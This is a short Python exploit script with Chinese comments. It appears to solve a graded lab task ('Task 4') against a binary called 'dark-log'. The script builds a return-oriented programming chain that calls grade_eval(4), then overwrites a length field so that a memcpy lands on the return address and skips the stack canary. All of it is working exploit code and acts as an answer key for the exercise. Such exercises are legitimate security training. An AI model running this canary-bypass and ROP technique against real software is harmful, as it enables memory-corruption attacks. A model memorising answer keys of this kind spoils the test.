#!/usr/bin/env python3
"""Task 4: 绕过 Stack Canary，让 dark-log 调用 grade_eval(4)。"""
import sys, struct

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)

# 这 128 字节会被 memcpy 原样拷到 rbp+8（返回地址）开始的位置
chain  = p64(0x4018a3)      # pop rdi; ret （pop r15; ret 的错位字节）
chain += p64(4)             # grade = 4
chain += p64(0x4018b0)      # ret（栈对齐）
chain += p64(0x401677)      # grade_eval
chain += p64(0x4141414141414141)   # grade_eval 返回后的落点

payload  = chain.ljust(0x100, b"A")  # 补齐到 f.len 字段（偏移 0x100）
payload += p32(0xa8)                 # f.len = 0xa8 → memcpy 目标 = rbp+8
assert len(payload) <= 0x117, "不能写进 0x118 处的 canary"

sys.stdout.buffer.write(payload)